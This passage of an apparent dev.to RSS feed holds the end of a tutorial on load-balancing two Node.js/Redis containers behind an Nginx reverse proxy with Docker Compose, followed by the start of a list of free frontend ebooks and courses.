(2) Load-balancing the Node.js server, with the help of a containerized Nginx reverse-proxy&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The diagram in “&lt;strong&gt;Figure 2.a – Schematic diagram of the components for Stage 2&lt;/strong&gt;” describes an architecture similar to the one described earlier in “&lt;strong&gt;Figure 1.a – Schematic diagram of the components&lt;/strong&gt;” but with the changes described below.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--dW6tGtNm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/02s6wkco89eaeu00ezxu.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--dW6tGtNm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/02s6wkco89eaeu00ezxu.png" alt="Figure 2.a – Schematic diagram of the components for Stage 2" width="856" height="484"&gt;&lt;/a&gt;&lt;br&gt;
&lt;em&gt;Figure 2.a – Schematic diagram of the components for Stage 2&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;In “&lt;strong&gt;Figure 2.a – Schematic diagram of the components for Stage 2&lt;/strong&gt;” we have the following components:&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;2.1.1&lt;/strong&gt;, &lt;strong&gt;2.1.2&lt;/strong&gt;) “&lt;em&gt;Docker Container 1&lt;/em&gt;” and “&lt;em&gt;Docker Container 2&lt;/em&gt;” – two identical containers whose source code reside in directories “&lt;em&gt;test-webapp-1&lt;/em&gt;” and “&lt;em&gt;test-webapp-2&lt;/em&gt;” (as shown in “&lt;strong&gt;Figure 2.b – File structure for Stage 2&lt;/strong&gt;” below), that are almost identical copies of the application “&lt;em&gt;test-webapp&lt;/em&gt;” that was described earlier in &lt;strong&gt;Stage 1&lt;/strong&gt;. This time we are using two &lt;strong&gt;Node.js server&lt;/strong&gt; processes that will serve the client browser from the local host machine, scaling up and load-balancing the original one-server configuration from &lt;strong&gt;Stage 1&lt;/strong&gt;. These two containers are defined and controlled each by their respective “&lt;em&gt;Dockerfile&lt;/em&gt;” (&lt;strong&gt;2.1.1.1&lt;/strong&gt;) and (&lt;strong&gt;2.1.1.2&lt;/strong&gt;). Each &lt;strong&gt;Node.js server&lt;/strong&gt; “&lt;em&gt;Docker Container 1&lt;/em&gt;” and “&lt;em&gt;Docker Container 2&lt;/em&gt;” counts the number of visits coming from the local host browser. Then it saves the number of visits into the &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; database, and it also responds back to the browser with the number of visits and with which specific &lt;strong&gt;Node.js server&lt;/strong&gt; served each individual &lt;em&gt;HTTP GET&lt;/em&gt; request coming from the browser, by sending back to the browser a message of type: &lt;br&gt;
“&lt;strong&gt;test-webapp-1&lt;/strong&gt;: Number of visits is: ”, or &lt;br&gt;
“&lt;strong&gt;test-webapp-2&lt;/strong&gt;: Number of visits is: ”&lt;br&gt;
…thus highlighting the load-leveling nature of this stage.&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;2.1.3&lt;/strong&gt;) “Docker Container 3” – the container running the &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; database instance, identical to the one described in &lt;strong&gt;Stage 1&lt;/strong&gt;, storing the “number of visits” performed by the localhost machine browser to “&lt;strong&gt;localhost:80&lt;/strong&gt;”. The number of visits is stored by the &lt;strong&gt;Node.js server&lt;/strong&gt; processes “&lt;em&gt;test-webapp-1&lt;/em&gt;” and “&lt;em&gt;test-webapp-2&lt;/em&gt;” in the &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; variable &lt;code&gt;numVisits&lt;/code&gt; whose value is transmitted by each &lt;strong&gt;Node.js server&lt;/strong&gt; to the &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; database on each refresh on the local host browser.&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;2.2&lt;/strong&gt;) “&lt;em&gt;&lt;a href="https://github.com/marcelkatz/test-docker-nodejs-redis-nginx/blob/main/docker-compose-nginx.yml"&gt;docker-compose-nginx.yml&lt;/a&gt;&lt;/em&gt;” – the main &lt;strong&gt;Docker Compose&lt;/strong&gt; config file defines and controls: (I) “&lt;em&gt;Docker Container 1&lt;/em&gt;” running &lt;strong&gt;Node.js server&lt;/strong&gt; “&lt;em&gt;test-webapp-1&lt;/em&gt;”,  (II) “&lt;em&gt;Docker Container 2&lt;/em&gt;” running &lt;strong&gt;Node.js server&lt;/strong&gt; “&lt;em&gt;test-webapp-2&lt;/em&gt;”, (III) “&lt;em&gt;Docker Container 3&lt;/em&gt;” running &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt;, and (IV) “&lt;em&gt;Docker Container 4&lt;/em&gt;” running &lt;strong&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;2.3&lt;/strong&gt;) “&lt;em&gt;Docker Container 4&lt;/em&gt;” running “&lt;em&gt;Nginx&lt;/em&gt;” – This is an additional container introduced in &lt;strong&gt;Stage 2&lt;/strong&gt;, defined and controlled by its own &lt;em&gt;Dockerfile&lt;/em&gt; (&lt;strong&gt;2.3.1&lt;/strong&gt;), that runs an “&lt;em&gt;nginx&lt;/em&gt;” instance, and acts a as reverse-proxy that routes the &lt;em&gt;HTTP GET&lt;/em&gt; requests coming from the local host browser. The “&lt;strong&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/strong&gt;” process in “&lt;em&gt;Docker Container 4&lt;/em&gt;” routes the &lt;em&gt;HTTP GET&lt;/em&gt; requests coming from local host browser “&lt;strong&gt;localhost:80&lt;/strong&gt;”, in a &lt;strong&gt;round-robin&lt;/strong&gt; manner (&lt;strong&gt;(2.3.3)&lt;/strong&gt; and &lt;strong&gt;(2.3.4)&lt;/strong&gt;), to either the “&lt;em&gt;test-webapp-1&lt;/em&gt;” &lt;strong&gt;Node.js server&lt;/strong&gt; in “&lt;em&gt;Docker Container 1&lt;/em&gt;” or to “&lt;em&gt;test-webapp-2&lt;/em&gt;” &lt;strong&gt;Node.js&lt;/strong&gt; server in “&lt;em&gt;Docker Container 2&lt;/em&gt;”. The “&lt;strong&gt;&lt;em&gt;nginx&lt;/em&gt;&lt;/strong&gt;” process in “&lt;em&gt;Docker Container 4&lt;/em&gt;” is defined and controlled by the &lt;strong&gt;_Nginx _&lt;/strong&gt;config file “&lt;em&gt;&lt;a href="https://github.com/marcelkatz/test-docker-nodejs-redis-nginx/blob/main/nginx/nginx.conf"&gt;nginx.conf&lt;/a&gt;&lt;/em&gt;” which is copied by &lt;strong&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/strong&gt; container’s &lt;em&gt;Dockerfile&lt;/em&gt; to the “&lt;em&gt;Docker Container 4&lt;/em&gt;” environment file “&lt;em&gt;/etc/nginx/conf.d./&lt;strong&gt;default.conf&lt;/strong&gt;&lt;/em&gt;” (this is a standard &lt;strong&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/strong&gt; setup). The “&lt;em&gt;nginx&lt;/em&gt;” instance distributes the incoming traffic from the local host browser, thus scaling up and load- balancing the single-container web/app server architecture presented in &lt;strong&gt;Stage 1&lt;/strong&gt;. &lt;/p&gt;

&lt;p&gt;And now let’s describe the steps and the flow of this scenario. The numbering scheme in the description below (i.e. (2.1), (2.2), (2.3) etc.), matches the numbering in “&lt;strong&gt;Figure 2.a – Schematic diagram of the components for Stage 2&lt;/strong&gt;”.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(2.1) File structure:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--5AOs-x2p--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8v7qndptehh545sknesh.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--5AOs-x2p--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8v7qndptehh545sknesh.png" alt="Figure 2.b – File structure for Stage 2" width="864" height="684"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The file structure described in “&lt;strong&gt;Figure 2.b – File structure for Stage 2&lt;/strong&gt;” is almost identical to the files structure described earlier in “&lt;strong&gt;Figure 1.b – File structure for Stage 1&lt;/strong&gt;” with the following changes:&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;2.1.1&lt;/strong&gt;, &lt;strong&gt;2.1.2&lt;/strong&gt;) The files from directory “&lt;em&gt;test-webapp&lt;/em&gt;” from &lt;strong&gt;Stage 1&lt;/strong&gt; were copied into directories “&lt;em&gt;test-webapp-1&lt;/em&gt;” and “&lt;em&gt;test-webapp-2&lt;/em&gt;”.&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;2.2&lt;/strong&gt;) Going one directory above, we see the "&lt;em&gt;&lt;a href="https://github.com/marcelkatz/test-docker-nodejs-redis-nginx/blob/main/docker-compose-nginx.yml"&gt;docker-compose-nginx.yml&lt;/a&gt;&lt;/em&gt;" config file that organizes the containerization and sets up the architecture of all the components:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--A8ZD3MU4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/23ztsgagx0fthaktnn3n.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--A8ZD3MU4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/23ztsgagx0fthaktnn3n.png" alt="'docker-compose-nginx.yml' file" width="293" height="106"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Purge all images and containers:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;As in &lt;strong&gt;Stage 1&lt;/strong&gt;, we run command &lt;code&gt;docker system prune -a&lt;/code&gt; to clear all Docker images and containers and start with a clean slate.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(2.3) Build and run the 'test-webapp-1',  'test-webapp-2', ‘redis’, and ‘nginx’ images with Docker Compose&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Build with Docker Compose:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;C:\test-docker\test-redis&amp;gt;**docker-compose -f docker-compose-nginx.yml build**&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Run with Docker Compose:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;C:\test-docker\test-redis&amp;gt;**docker-compose -f docker-compose-nginx.yml up**&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;In the command line window where we issues the &lt;code&gt;docker-compose -f docker-compose-nginx.yml up&lt;/code&gt;”\ command, &lt;strong&gt;Docker Compose&lt;/strong&gt; replies with:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Ufv9ddaS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xi20q9vn6kp7m67olqst.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Ufv9ddaS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xi20q9vn6kp7m67olqst.PNG" alt="4 containers running" width="663" height="193"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;...showing that all 4 Docker containers have started successfully and are up and running: “&lt;em&gt;test-redis_1&lt;/em&gt;” corresponds to the &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; process running in “&lt;em&gt;Docker Container 3&lt;/em&gt;”, “&lt;em&gt;test-webapp-2_1&lt;/em&gt;” corresponds to the &lt;strong&gt;Node.js server&lt;/strong&gt; process running in “&lt;em&gt;Docker Container 2&lt;/em&gt;”, “&lt;em&gt;test-webapp-1_1&lt;/em&gt;” corresponds to the &lt;strong&gt;Node.js server&lt;/strong&gt; process running in “&lt;em&gt;Docker Container 1&lt;/em&gt;”, and “&lt;em&gt;nginx_1&lt;/em&gt;” corresponds to the &lt;strong&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/strong&gt; server running in “&lt;em&gt;Docker Container 4&lt;/em&gt;”.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;View the 'test-webapp-1', ‘test-webapp-2’, 'redis', and ‘nginx’ running containers:&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;C:\test-docker\test-redis&amp;gt;**docker ps**   
CONTAINER ID   IMAGE                             PORTS       NAMES                                            c675ff6c0464   test-redis_nginx                  0.0.0.0:80-&amp;gt;80/tcp             test-redis_nginx_1                               
3137d1468ec7         test-redis_test-webapp-2     0.0.0.0:3009-&amp;gt;5000/tcp   test-redis_test-webapp-2_1                       
**_57d399295421         _**redis:alpine                                                                         test-redis_test-redis_1                          
b30635f44151          test-redis_test-webapp-1     0.0.0.0:3008-&amp;gt;5000/tcp   test-redis_test-webapp-1_1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The four containers above match containers “&lt;em&gt;Docker Container 1&lt;/em&gt;” through “&lt;em&gt;Docker Container 4&lt;/em&gt;” in “&lt;strong&gt;Figure 2.a – Schematic diagram of the components for Stage 2&lt;/strong&gt;”&lt;br&gt;
above. Note the “&lt;em&gt;CONTAINER ID&lt;/em&gt;” column whose values we will use below to potentially perform operations on each individual running container.&lt;/p&gt;

&lt;p&gt;Let’s run first two instances of the browser on the hosting machine, and point them to URL “&lt;strong&gt;localhost:80&lt;/strong&gt;”:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--OpVMnmS4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/42dwmonlt8jn07ifovp0.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--OpVMnmS4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/42dwmonlt8jn07ifovp0.png" alt="2.3 Browser - test-webapp-2 - number of visits 7" width="513" height="159"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--sOWO-DD_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/d06t4jutlz9c47pd5po8.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--sOWO-DD_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/d06t4jutlz9c47pd5po8.png" alt="2.3 Browser - test-webapp-1 - number of visits 8" width="513" height="156"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Notice how due to the &lt;strong&gt;round-robin&lt;/strong&gt; routing mechanism employed by the &lt;strong&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/strong&gt; reverse-proxy, the “&lt;em&gt;GET localhost:80&lt;/em&gt;” request is routed once to “&lt;em&gt;test-webapp-1&lt;/em&gt;” &lt;strong&gt;Node.js server&lt;/strong&gt;, and once to the “&lt;em&gt;test-webapp-2&lt;/em&gt;” &lt;strong&gt;Node.js server&lt;/strong&gt;, achieving the scaling-up and load balancing that we intended to demonstrate. &lt;/p&gt;

&lt;p&gt;Let’s connect to the container that is running &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt;, to its &lt;strong&gt;&lt;em&gt;sh&lt;/em&gt;&lt;/strong&gt; (shell) environment:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;C:\test-docker\test-redis&amp;gt;**docker exec -it** 57d399295421 **sh**&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Then, inside the container, let’s connect to &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; itself using “&lt;em&gt;redis-cli&lt;/em&gt;”:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;/data #                                                                                                                                          /data # **redis-cli **                                                                                                                               127.0.0.1:6379&amp;gt;                                                                                                                                  127.0.0.1:6379&amp;gt; **get numVisits**                                                                                                                    "**8**"                                                                                                                                              127.0.0.1:6379&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Note how the &lt;code&gt;get numVisits&lt;/code&gt; command in &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; returns the expected value of “number of visits” that is communicated to the “&lt;strong&gt;&lt;em&gt;redis&lt;/em&gt;&lt;/strong&gt;” container from the containers that are running the &lt;strong&gt;Node.js app servers&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In &lt;strong&gt;Stage 2&lt;/strong&gt; of this example we showed how &lt;strong&gt;Docker Compose&lt;/strong&gt; allows us to easily establish multiple containers with their independent environments that communicate with each other, and also how scaling and load-balancing achieved with Nginx.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Source code:&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://github.com/marcelkatz/test-docker-nodejs-redis-nginx"&gt;https://github.com/marcelkatz/test-docker-nodejs-redis-nginx&lt;/a&gt;&lt;/p&gt;

</description>
      <category>docker</category>
      <category>node</category>
      <category>redis</category>
      <category>nginx</category>
    </item>
    <item>
      <title>Free Ebook &amp; Courses for Frontend Devs</title>
      <author>Suprabha</author>
      <pubDate>Fri, 24 Dec 2021 21:30:39 +0000</pubDate>
      <link>https://dev.to/suprabhasupi/free-ebook-courses-for-frontend-devs-17hm</link>
      <guid>https://dev.to/suprabhasupi/free-ebook-courses-for-frontend-devs-17hm</guid>
      <description>&lt;p&gt;As we know, online courses or ebooks are the best resources for learning Frontend Engineer/development. &lt;/p&gt;

&lt;p&gt;Sometimes it's really hard to buy ebooks or courses. Like when I was a student I was mostly trying to figure out where I can find the free resources for learning HTML, CSS, JavaScript.&lt;/p&gt;

&lt;p&gt;There I found MDN, FreeCodeCamp, a few more.&lt;/p&gt;

&lt;p&gt;I will be sharing the resources here in this post and hope they will be helpful.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#free-ebooks"&gt;
  &lt;/a&gt;
  Free Ebooks 📚
&lt;/h3&gt;

&lt;h4&gt;
  &lt;a href="#1-javascript-garden"&gt;
  &lt;/a&gt;
  1. &lt;a href="https://bonsaiden.github.io/JavaScript-Garden/"&gt;JavaScript Garden&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qhk48W8l--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/Qg58g37.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qhk48W8l--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/Qg58g37.png" width="880" height="531"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;JavaScript Garden is a growing collection of documentation about the most quirky parts of the JavaScript programming language.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#2-html5-notes-for-professionals-book"&gt;
  &lt;/a&gt;
  2. &lt;a href="https://goalkicker.com/HTML5Book/"&gt;HTML5 Notes for Professionals book&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--TEd_DYAh--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/D5VUWiP.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--TEd_DYAh--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/D5VUWiP.png" width="880" height="635"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Free Programming Books. Disclaimer. This is an uno cial free book created for educational purposes and is.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#3-odin-project"&gt;
  &lt;/a&gt;
  3. &lt;a href="https://www.theodinproject.com/home"&gt;Odin Project&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--_CrHUsJH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/yyf49hi.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_CrHUsJH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/yyf49hi.png" width="880" height="431"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The Odin Project empowers aspiring web developers to learn together for free.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#4-css-animation"&gt;
  &lt;/a&gt;
  4. &lt;a href="https://cssanimation.rocks/"&gt;CSS Animation&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--IQSKo6PF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/vFd3mr3.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--IQSKo6PF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/vFd3mr3.png" width="880" height="376"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Learn CSS Animation with awesome tutorials, video courses and a weekly CSS Animation newsletter.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#5-javascript-books-collection"&gt;
  &lt;/a&gt;
  5. &lt;a href="https://jsbooks.revolunet.com/"&gt;JavaScript Books Collection &lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--jLt-9VGl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/quV1DlS.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--jLt-9VGl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/quV1DlS.png" width="880" height="542"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;JSbooks is a showcase of the bests free ebooks about Javascript. Find here the best publications about your favourite programming language.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#6-web-visual-effects-with-css3"&gt;
  &lt;/a&gt;
  6. &lt;a href="https://leanpub.com/web-visual-effects-with-css3/read"&gt;Web Visual Effects with CSS3&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--jZB2g1xK--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/dQInrsz.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--jZB2g1xK--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/dQInrsz.png" width="880" height="585"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This is a book with examples and solutions to create practical visual effects on the web by using CSS3.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#7-eloquent-javascript"&gt;
  &lt;/a&gt;
  7. &lt;a href="https://eloquentjavascript.net/"&gt;Eloquent JavaScript&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--_T4NFaGB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/59g5xfx.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_T4NFaGB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/59g5xfx.png" width="880" height="519"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Eloquent Javascript 3rd edition is widely considered one of the best books on Javascript. Released at the end of 2018, the book is still touted as the best Javascript book, even in 2020. Eloquent JavaScript is unlike so many of the educational materials out there.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#8-the-magic-of-css"&gt;
  &lt;/a&gt;
  8. &lt;a href="https://adamschwartz.co/magic-of-css/"&gt;The Magic Of CSS&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--L3oLSoKz--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/kOWWCUY.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--L3oLSoKz--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/kOWWCUY.png" width="880" height="781"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;A CSS course to turn you into a magician. Contribute to adamschwartz/magic-of-css development by creating an account on GitHub.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#9-marksheet"&gt;
  &lt;/a&gt;
  9. &lt;a href="https://marksheet.io/"&gt;MarkSheet&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--zcdVDt9v--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/CN5fjQu.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--zcdVDt9v--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/CN5fjQu.png" width="880" height="587"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This ebook is a step by step guide in which I teach you how to build your own personal webpage from scratch, line by line, with HTML5, CSS3, and even JS.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#10-html-canvas-deep-dive"&gt;
  &lt;/a&gt;
  10. &lt;a href="https://joshondesign.com/p/books/canvasdeepdive/toc.html"&gt; HTML Canvas Deep Dive&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--upd8oYRA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/scx3xfn.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--upd8oYRA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/scx3xfn.png" width="880" height="655"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;HTML Canvas Deep Dive is a hands on introduction to Canvas. Code along with the book and play with interactive examples&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#11-a-guide-to-html5-and-css3"&gt;
  &lt;/a&gt;
  11. &lt;a href="https://html5hive.org/free-ebook-a-guide-to-html5-and-css3/"&gt;A Guide to HTML5 and CSS3&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--4TAKlMc5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/9OcFRhN.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--4TAKlMc5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/9OcFRhN.png" width="880" height="874"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The Essential Guide to HTML5 and CSS3 Web Design has been fully revised from its critically acclaimed first edition and updated to include all of the new features and best practices of HTML5 and CSS3.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#12-frontend-mentor"&gt;
  &lt;/a&gt;
  12. &lt;a href="https://www.frontendmentor.io/"&gt;Frontend Mentor&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--admu36_C--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/DyjXwS5.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--admu36_C--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/DyjXwS5.png" width="880" height="424"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Improve your front-end skills by building real projects. Solve real-world HTML, CSS and JavaScript challenges whilst working on professional designs.&lt;/p&gt;




&lt;h3&gt;
  &lt;a href="#free-courses"&gt;
  &lt;/a&gt;
